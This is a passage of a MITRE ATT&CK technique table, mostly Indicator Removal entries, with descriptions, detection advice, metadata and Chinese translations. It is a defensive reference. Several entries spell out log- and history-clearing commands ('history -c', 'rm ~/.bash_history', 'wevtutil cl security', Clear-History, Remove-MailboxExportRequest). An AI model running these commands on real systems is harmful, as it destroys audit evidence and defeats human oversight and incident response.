In containerized environments, changes may be detectable by monitoring the Docker daemon logs or setting up and monitoring Kubernetes audit logs depending on registry configuration. ","Containers, IaaS","Image: Image Creation, Image: Image Metadata, Image: Image Modification",False,,,"Praetorian; Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team",User,,,,,,",(Citation: Content trust in Docker),(Citation: Content trust in Azure Container Registry)",在内部植入容器镜像,攻击者可能会在访问环境后植入带有恶意代码的云或容器映像，以建立持久性。亚马逊网络服务 (AWS) 亚马逊机器映像 (AMI)、谷歌云平台 (GCP) 映像和 Azure 映像以及流行的容器运行时（例如 Docker）可以被植入或后门。与 [上传恶意软件](https://attack.mitre.org/techniques/T1608/001) 不同，该技术侧重于攻击者在受害者环境中的注册表中植入图像。根据配置基础架构的方式，如果指示基础架构配置工具始终使用最新映像，则可以提供持久访问。（引用：Rhino Labs Cloud Image Backdoor Technique Sept 2019）已开发出一种工具来促进在云中植入后门容器镜像。（引用：Rhino Labs Cloud Backdoor September 2019）如果攻击者有权访问受感染的 AWS 实例，并有权列出可用的容器镜像，他们可能会植入后门，例如 [Web Shell](https:// attack.mitre.org/techniques/T1505/003）。（引用：Rhino Labs 云图像后门技术，2019 年 9 月）
T1070,Indicator Removal,"Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.

Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",https://attack.mitre.org/techniques/T1070,31 May 2017,21 October 2022,2.0,Defense Evasion,File system monitoring may be used to detect improper deletion or modification of indicator files.  Events not stored on the file system may require different detection mechanisms.,"Containers, Google Workspace, Linux, Network, Office 365, Windows, macOS","Command: Command Execution, File: File Deletion, File: File Metadata, File: File Modification, Firewall: Firewall Rule Modification, Network Traffic: Network Traffic Content, Process: OS API Execution, Process: Process Creation, Scheduled Job: Scheduled Job Modification, User Account: User Account Authentication, Windows Registry: Windows Registry Key Deletion, Windows Registry: Windows Registry Key Modification",False,,"Anti-virus, Host intrusion prevention systems, Log analysis","Blake Strom, Microsoft 365 Defender; Brad Geesaman, @bradgeesaman; Ed Williams, Trustwave, SpiderLabs",,,,CAPEC-93,,,"(Citation: McAfee Sharpshooter December 2018),(Citation: Microsoft NICKEL December 2021),(Citation: Lazarus APT January 2022),(Citation: ESET Hermetic Wizard March 2022),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: McAfee Maze March 2020),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Cybereason Kimsuky November 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Donut Github),(Citation: Proofpoint TA505 October 2019),(Citation: FireEye Metamorfo Apr 2018),(Citation: F-Secure BlackEnergy 2014),(Citation: Prevailion EvilNum May 2020),(Citation: NTT Security Flagpro new December 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: US-CERT Bankshot Dec 2017),(Citation: Prevailion DarkWatchman 2021),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Cylance Dust Storm),",迹象移除/清除痕迹,攻击者可能会删除或修改系统内生成的工件，以删除其存在的证据或阻碍防御。对手可能会创建各种人工制品，或者可以归因于对手的行为的东西。通常，这些工件用作与受监控事件相关的防御指标，例如下载文件中的字符串、用户操作生成的日志以及防御者分析的其他数据。工件的位置、格式和类型（例如命令或登录历史）通常特定于每个平台。删除这些指标可能会干扰事件收集、报告或其他用于检测入侵活动的过程。这可能会导致显着事件未被报告，从而损害安全解决方案的完整性。由于缺乏足够的数据来确定发生了什么，此活动还可能阻碍取证分析和事件响应。
T1070.003,Indicator Removal: Clear Command History,"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.

On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.

Adversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  

Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)

On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.

The <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)

Adversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",https://attack.mitre.org/techniques/T1070/003,31 January 2020,01 September 2022,1.3,Defense Evasion,"User authentication, especially via remote terminal services like SSH, without new entries in that user's <code>~/.bash_history</code> is suspicious. Additionally, the removal/clearing of the <code>~/.bash_history</code> file can be an indicator of suspicious activity.

Monitor for suspicious modifications or deletion of <code>ConsoleHost_history.txt</code> and use of the <code>Clear-History</code> command.","Linux, Network, Windows, macOS","Command: Command Execution, File: File Deletion, File: File Modification, User Account: User Account Authentication, User Account: User Account Metadata",True,T1070,"Host forensic analysis, Log analysis","Austin Clark, @c2defense; Emile Kenning, Sophos; Vikas Singh, Sophos",,,,,,,"(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Securelist APT10 March 2021),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Trend Micro TeamTNT),(Citation: ESET Kobalos Feb 2021),(Citation: FireEye APT41 Aug 2019),(Citation: Cisco Talos Intelligence Group),(Citation: Unit 42 Hildegard Malware),(Citation: Securing bash history)",迹象移除/清除痕迹：清除命令历史记录,除了清除系统日志外，攻击者还可以清除受感染帐户的命令历史记录，以隐藏入侵期间采取的行动。各种命令解释器跟踪用户在终端中键入的命令，以便用户可以追溯他们所做的事情。在 Linux 和 macOS 上，可以通过几种不同的方式访问这些命令历史记录。登录时，此命令历史记录在环境变量 <code>HISTFILE</code> 指向的文件中进行跟踪。当用户注销系统时，此信息将刷新到用户主目录中名为 <code>~/.bash_history</code> 的文件中。这样做的好处是它允许用户返回他们之前在不同会话中使用过的命令。攻击者可以通过手动清除历史记录 (<code>history -c</code>) 或删除 bash 历史记录文件 <code>rm ~/.bash_history</code> 来从这些日志中删除他们的命令。攻击者还可以利用网络设备上的 [网络设备 CLI](https://attack.mitre.org/techniques/T1059/008) 来清除命令历史数据（<code>clear logging</code> 和/或 <code >clear history</code>）。（引用：US-CERT-TA18-106A）在 Windows 主机上，PowerShell 有两个不同的命令历史提供程序：内置历史记录和由 <code>PSReadLine</ 管理的命令历史记录代码>模块。内置历史记录仅跟踪当前会话中使用的命令。此命令历史记录对其他会话不可用，并在会话结束时被删除。 <code>PSReadLine</code> 命令历史记录跟踪所有 PowerShell 会话中使用的命令并将它们写入文件 (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>默认）。此历史记录文件可用于所有会话，并包含所有过去的历史记录，因为该文件在会话结束时不会被删除。（引用：Microsoft PowerShell 命令历史记录）攻击者可以运行 PowerShell 命令 <code>Clear-History</code> 来刷新当前 PowerShell 会话的整个命令历史记录。但是，这不会删除/刷新 <code>ConsoleHost_history.txt</code> 文件。攻击者还可以删除 <code>ConsoleHost_history.txt</code> 文件或编辑其内容以隐藏他们已运行的 PowerShell 命令。（引用：Sophos PowerShell 命令审核）（引用：Sophos PowerShell 命令历史取证）
T1070.002,Indicator Removal: Clear Linux or Mac System Logs,"Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)

* <code>/var/log/messages:</code>: General and system-related messages
* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs
* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records
* <code>/var/log/kern.log</code>: Kernel logs
* <code>/var/log/cron.log</code>: Crond logs
* <code>/var/log/maillog</code>: Mail server logs
* <code>/var/log/httpd/</code>: Web server access and error logs
",https://attack.mitre.org/techniques/T1070/002,28 January 2020,29 March 2020,1.0,Defense Evasion,File system monitoring may be used to detect improper deletion or modification of indicator files. Also monitor for suspicious processes interacting with log files.,"Linux, macOS","Command: Command Execution, File: File Deletion, File: File Modification",True,T1070,,,,,,,,,"(Citation: ESET DazzleSpy Jan 2022),(Citation: objsee mac malware 2017),(Citation: Aqua TeamTNT August 2020),(Citation: Anomali Rocke March 2019),",迹象移除/清除痕迹：清除 Linux 或 Mac 系统日志,攻击者可能会清除系统日志以隐藏入侵证据。 macOS 和 Linux 都通过系统日志跟踪系统或用户启动的操作。大多数本机系统日志存储在 <code>/var/log/</code> 目录下。该目录下的子文件夹按照日志的相关功能对日志进行分类，例如：(Citation: Linux Logs) * <code>/var/log/messages:</code>：一般和系统相关的消息 * <code>/var/log /secure</code> 或 <code>/var/log/auth.log</code>：身份验证日志 * <code>/var/log/utmp</code> 或 <code>/var/log/wtmp< /code>：登录记录 * <code>/var/log/kern.log</code>：内核日志 * <code>/var/log/cron.log</code>：Crond 日志 * <code>/var /log/maillog</code>：邮件服务器日志 * <code>/var/log/httpd/</code>：Web服务器访问和错误日志
T1070.008,Indicator Removal: Clear Mailbox Data,"Adversaries may modify mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails or logs generated by the application or operating system, such as export requests. 

Adversaries may manipulate email mailbox data to remove logs and artifacts, such as evidence of [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/techniques/T1071/003) for command and control, or email-based exfiltration such as [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). For example, to remove evidence on Exchange servers adversaries have used the <code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) module, including <code>Remove-MailboxExportRequest</code> to remove evidence of mailbox exports.(Citation: Volexity SolarWinds)(Citation: ExchangePowerShell Module) On Linux and macOS, adversaries may also delete emails through a command line utility called <code>mail</code>  or use [AppleScript](https://attack.mitre.org/techniques/T1059/002) to interact with APIs on macOS.(Citation: Cybereason Cobalt Kitty 2017)(Citation: mailx man page)",https://attack.mitre.org/techniques/T1070/008,08 July 2022,17 October 2022,1.0,Defense Evasion,,"Google Workspace, Linux, Office 365, Windows, macOS","Command: Command Execution, File: File Deletion, File: File Modification, Process: Process Creation",True,T1070,,,,,,,,,"(Citation: Cybereason Cobalt Kitty 2017),(Citation: Volexity SolarWinds),",迹象移除/清除痕迹：清除邮箱数据,攻击者可能会修改邮件应用程序数据以删除其活动的证据。电子邮件应用程序允许用户和其他程序通过命令行工具或使用 API 导出和删除邮箱数据。邮件应用程序数据可以是应用程序或操作系统生成的电子邮件或日志，例如导出请求。攻击者可能会操纵电子邮件邮箱数据以删除日志和人工制品，例如 [网络钓鱼](https://attack.mitre.org/techniques/T1566)/[内部鱼叉式网络钓鱼](https://attack.mitre.org/) 的证据技术/T1534)、[电子邮件收集](https://attack.mitre.org/techniques/T1114)、[邮件协议](https://attack.mitre.org/techniques/T1071/003) 用于命令和控制，或基于电子邮件的泄露，例如 [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048)。例如，要删除 Exchange 服务器上的证据，攻击者使用了 <code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) 模块，包括 <code>Remove-MailboxExportRequest </code> 删除邮箱导出的证据。（引用：Volexity SolarWinds）（引用：ExchangePowerShell 模块）在 Linux 和 macOS 上，攻击者还可以通过名为 <code>mail</code> 的命令行实用程序删除电子邮件或使用 [ AppleScript](https://attack.mitre.org/techniques/T1059/002) 与 macOS 上的 API 交互。（引用：Cybereason Cobalt Kitty 2017）（引用：mailx 手册页）
T1070.007,Indicator Removal: Clear Network Connection History and Configurations,"Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system from behaviors that require network connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.

Network connection history may be stored in various locations on a system. For example, RDP connection history may be stored in Windows Registry values under (Citation: Microsoft RDP Removal):

* <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers</code>

Windows may also store information about recent RDP connections in files such as <code>C:\Users\\%username%\Documents\Default.rdp</code> and `C:\Users\%username%\AppData\Local\Microsoft\Terminal
Server Client\Cache\`.(Citation: Moran RDPieces) Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)

Malicious network connections may also require changes to network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",https://attack.mitre.org/techniques/T1070/007,15 June 2022,21 October 2022,1.0,Defense Evasion,,"Linux, Network, Windows, macOS","Command: Command Execution, File: File Modification, Firewall: Firewall Rule Modification, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1070,,CrowdStrike Falcon OverWatch,,,,,,,"(Citation: Microsoft Deep Dive Solorigate January 2021),",迹象移除/清除痕迹：清除网络连接历史记录和配置,攻击者可能会清除或删除恶意网络连接的证据，以清理他们的操作痕迹。可以根据需要网络连接的行为在系统上创建配置设置以及突出连接历史记录的各种工件，例如 [Remote Services](https://attack.mitre.org/techniques/T1021) 或 [External Remote Services ]（https://attack.mitre.org/techniques/T1133）。防御者可以使用这些工件来监控或以其他方式分析对手创建的网络连接。网络连接历史可以存储在系统的不同位置。例如，RDP 连接历史记录可能存储在（引用：Microsoft RDP 删除）下的 Windows 注册表值中：* <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default</code> * <code>HKEY_CURRENT_USER\Software\Microsoft \Terminal Server Client\Servers</code> Windows 还可以将有关最近 RDP 连接的信息存储在文件中，例如 <code>C:\Users\\%username%\Documents\Default.rdp</code> 和 `C:\ Users\%username%\AppData\Local\Microsoft\Terminal Server Client\Cache\`.(Citation: Moran RDPieces) 同样，macOS 和 Linux 主机可能会在系统日志中存储突出连接历史记录的信息（例如存储在 `/Library 中的信息） /Logs` 和/或 `/var/log/`）。（引用：Apple Culprit Access）（引用：FreeDesktop Journal）（引用：Apple 统一日志分析远程登录和屏幕共享）恶意网络连接可能还需要更改网络配置设置，如【禁用或修改系统防火墙】(https://attack.mitre.org/techniques/T1562 /004) 或篡改以启用 [代理](https://attack.mitre.org/techniques/T1090)。攻击者可能会删除或修改这些数据以隐藏指标和/或阻碍防御性分析。
T1070.009,Indicator Removal: Clear Persistence,"Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, [Modify Registry](https://attack.mitre.org/techniques/T1112), [Plist File Modification](https://attack.mitre.org/techniques/T1647), or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence.(Citation: Cylance Dust Storm)

In some instances, artifacts of persistence may also be removed once an adversary’s persistence is executed in order to prevent errors with the new instance of the malware.(Citation: NCC Group Team9 June 2020)",https://attack.mitre.org/techniques/T1070/009,29 July 2022,18 October 2022,1.0,Defense Evasion,,"Linux, Windows, macOS","Command: Command Execution, File: File Deletion, File: File Modification, Process: Process Creation, Scheduled Job: Scheduled Job Modification, Windows Registry: Windows Registry Key Deletion, Windows Registry: Windows Registry Key Modification",True,T1070,,,,,,,,,"(Citation: NCC Group Team9 June 2020),(Citation: Secureworks MCMD July 2019),(Citation: Trustwave Pillowmint June 2020),(Citation: Trend Micro njRAT 2018),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Group IB GrimAgent July 2021),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Cylance Dust Storm),(Citation: ESET RTM Feb 2017),",迹象移除/清除痕迹：清除持久性,攻击者可能会清除与主机系统上先前建立的持久性相关的工件，以删除其活动的证据。这可能涉及各种操作，例如删除服务、删除可执行文件、[修改注册表](https://attack.mitre.org/techniques/T1112)、[Plist 文件修改](https://attack.mitre.org/技术/T1647），或其他清理方法，以防止防御者收集其持久存在的证据。（引文：Cylance Dust Storm）在某些情况下，一旦执行对手的持久性，也可以删除持久性工件以防止错误使用新的恶意软件实例。（引用：NCC Group Team9 June 2020）
T1070.001,Indicator Removal: Clear Windows Event Logs,"Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.

The event logs can be cleared with the following utility commands:

* <code>wevtutil cl system</code>
* <code>wevtutil cl application</code>
* <code>wevtutil cl security</code>

These logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001).",https://attack.mitre.org/techniques/T1070/001,28 January 2020,20 April 2022,1.1,Defense Evasion,"Deleting Windows event logs (via native binaries (Citation: Microsoft wevtutil Oct 2017), API functions (Citation: Microsoft EventLog.Clear), or [PowerShell](https://attack.mitre.org/techniques/T1059/001) (Citation: Microsoft Clear-EventLog)) may also generate an alterable event (Event ID 1102: ""The audit log was cleared"").",Windows,"Command: Command Execution, File: File Deletion, Process: OS API Execution",True,T1070,"Anti Virus, Host Intrusion Prevention Systems, Log Analysis",,,,Clearing the Windows event logs requires Administrator permissions,,,,"(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: FireEye APT32 May 2017),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Wevtutil Microsoft Documentation),(Citation: FoxIT Wocao December 2019),(Citation: ESET Hermetic Wizard March 2022),(Citation: Unit 42 Lucifer June 2020),(Citation: GitHub Pupy),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: McAfee Gold Dragon),(Citation: Gh0stRAT ATT March 2019),(Citation: FinFisher Citation),(Citation: FireEye Hacking Team),(Citation: FireEye APT41 Aug 2019),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Talos Nyetya June 2017),(Citation: Talos Olympic Destroyer 2018),(Citation: Talos ZxShell Oct 2014),(Citation: Crowdstrike DNC June 2016),(Citation: FireEye APT38 Oct 2018),(Citation: Symantec Hydraq Jan 2010),(Citation: NCC Group Chimera January 2021),(Citation: Symantec WastedLocker June 2020),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: US-CERT TA18-074A),(Citation: Check Point Meteor Aug 2021),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: ESEST Black Energy Jan 2016),(Citation: Microsoft FinFisher March 2018),",迹象移除/清除痕迹：清除 Windows 事件日志,攻击者可能会清除 Windows 事件日志以隐藏入侵活动。 Windows 事件日志是计算机警报和通知的记录。系统定义了三种事件源：系统、应用程序和安全，具有五种事件类型：错误、警告、信息、成功审计和失败审计。可以使用以下实用程序命令清除事件日志： * <code>wevtutil cl system</code> * <code>wevtutil cl application</code> * <code>wevtutil cl security</code> 这些日志也可能是通过其他机制清除，例如事件查看器 GUI 或 [PowerShell](https://attack.mitre.org/techniques/T1059/001)。
T1070.004,Indicator Removal: File Deletion,"Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.

There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",https://attack.mitre.org/techniques/T1070/004,31 January 2020,16 April 2022,1.1,Defense Evasion,"It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.","Linux, Windows, macOS","Command: Command Execution, File: File Deletion",True,T1070,Host forensic analysis,Walker Johnson,,,,,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Cyberreason Anchor December 2019),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: FireEye APT32 May 2017),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Fidelis njRAT June 2013),(Citation: Cylance Shaheen Nov 2018),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: McAfee Bankshot),(Citation: Kaspersky Lyceum October 2021),(Citation: FoxIT Wocao December 2019),(Citation: ATT QakBot April 2021),(Citation: ESET Sednit Part 1),(Citation: ESET RTM Feb 2017),(Citation: ESET Hermetic Wizard March 2022),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: ESET LoudMiner June 2019),(Citation: Unit 42 Inception November 2018),(Citation: TrendMicro MacOS April 2018),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: ESET Sednit Part 2),(Citation: FireEye APT17),(Citation: ESET Operation Groundbait),(Citation: Symantec Remsec IOCs),(Citation: Talos Promethium June 2020),(Citation: Bitdefender StrongPity June 2020),(Citation: Securelist Dtrack),(Citation: ESET Zebrocy Nov 2018),(Citation: ESET Zebrocy May 2019),(Citation: Unit42 Emissary Panda May 2019),(Citation: Trustwave Cherry Picker),(Citation: Accenture Dragonfish Jan 2018),(Citation: Group IB Ransomware September 2020),(Citation: FireEye Clandestine Fox),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Dell Sakula),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Novetta Blockbuster),(Citation: Symantec Hydraq Jan 2010),(Citation: Symantec Seaduke 2015),(Citation: Medium Metamorfo Apr 2020),(Citation: Talos Lokibot Jan 2021),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Symantec Shuckworm January 2022),(Citation: Unit 42 Sofacy Feb 2018),(Citation: FireEye FIN6 April 2016),(Citation: KISA Operation Muzabi),(Citation: Trend Micro DRBControl February 2020),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Intel 471 REvil March 2020),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: ASERT InnaputRAT April 2018),(Citation: Deep Instinct TA505 Apr 2019),(Citation: BlackBerry CostaRicto November 2020),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Crowdstrike Qakbot October 2020),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FireEye APT34 Dec 2017),(Citation: Prevailion DarkWatchman 2021),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: ESET LightNeuron May 2019),(Citation: Proofpoint TA505 Jan 2019),(Citation: Unit 42 OilRig Sept 2018),(Citation: Microsoft SDelete July 2016),(Citation: Sofacy Komplex Trojan),(Citation: ESET Sednit USBStealer 2014),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Trustwave Pillowmint June 2020),(Citation: US-CERT TYPEFRAME June 2018),(Citation: McAfee Night Dragon),(Citation: McAfee Cuba April 2021),(Citation: McAfee Sharpshooter December 2018),(Citation: CheckPoint Naikon May 2020),(Citation: Secureworks Karagany July 2019),(Citation: Unit 42 BackConfig May 2020),(Citation: Symantec Dragonfly),(Citation: Unit42 Redaman January 2019),(Citation: FireEye FIN10 June 2017),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: CISA EB Aug 2020),(Citation: Fidelis INOCNATION),(Citation: CheckPoint SpeakUp Feb 2019),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Kaspersky Turla Aug 2014),(Citation: FBI FLASH APT39 September 2020),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Securelist Calisto July 2018),(Citation: Profero APT27 December 2020),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: CERT-EE Gamaredon January 2021),(Citation: McAfee Gold Dragon),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: McAfee Oceansalt Oct 2018),(Citation: Malwarebytes Pony April 2016),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: Cybereason Oceanlotus May 2017),(Citation: Talos Bisonal Mar 2020),(Citation: ESET Telebots July 2017),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Cybereason Kimsuky November 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: FireEye Periscope March 2018),(Citation: DOJ GRU Indictment Jul 2018),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Anomali Rocke March 2019),(Citation: NSA/FBI Drovorub August 2020),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Proofpoint TA505 October 2019),(Citation: Novetta Winnti April 2015),(Citation: FireEye CARBANAK June 2017),(Citation: ESET Okrum July 2019),(Citation: Unit 42 Kazuar May 2017),(Citation: Flashpoint FIN 7 March 2019),(Citation: McAfee GhostSecret),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: CrowdStrike Grim Spider May 2019),(Citation: FireEye HAWKBALL Jun 2019),(Citation: Dell Lateral Movement),(Citation: CERT-FR PYSA April 2020),(Citation: Palo Alto Reaver Nov 2017),(Citation: McAfee Honeybee),(Citation: Cybereason Cobalt Kitty 2017),(Citation: US-CERT TA18-074A),(Citation: ESET Grandoreiro April 2020),(Citation: Talos Konni May 2017),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Proofpoint Bumblebee April 2022),(Citation: Cyphort EvilBunny Dec 2014),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: TrendMicro Lazarus Nov 2018),(Citation: Microsoft PLATINUM April 2016),(Citation: CheckPoint Bandook Nov 2020),(Citation: Kaspersky ProjectSauron Full Report),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Mandiant No Easy Breach),(Citation: FireEye MESSAGETAP October 2019),(Citation: Cisco Talos Intelligence Group),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Cylance Dust Storm),(Citation: Unit 42 Bisonal July 2018),(Citation: Trend Micro IXESHE 2012),(Citation: Morphisec ShellTea June 2019),(Citation: Symantec Pasam May 2012),(Citation: Unit 42 QUADAGENT July 2018),(Citation: fsecure NanHaiShu July 2016),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Cycraft Chimera April 2020),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Securelist Kimsuky Sept 2013),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Kroll Qakbot June 2020),(Citation: NCC Group Team9 June 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: Unit42 BabyShark Apr 2019),(Citation: Unit 42 CARROTBAT November 2018),(Citation: ESET InvisiMole June 2020),(Citation: ESET InvisiMole June 2018),(Citation: Palo Alto MoonWind March 2017),(Citation: Palo Alto Networks BBSRAT),(Citation: NCCGroup RokRat Nov 2018),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: CrowdStrike IceApple May 2022),(Citation: CISA AppleJeus Feb 2021),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: FireEye MuddyWater Mar 2018),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Trend Micro njRAT 2018),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: FireEye APT35 2018),(Citation: Kaspersky MoleRATs April 2019),(Citation: Talos ZxShell Oct 2014),(Citation: Group IB Silence Sept 2018),(Citation: ZScaler Hacking Team),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Group IB GrimAgent July 2021),(Citation: Talos Kimsuky Nov 2021),(Citation: ESET Telebots Dec 2016),(Citation: Korean FSI TA505 2020),(Citation: 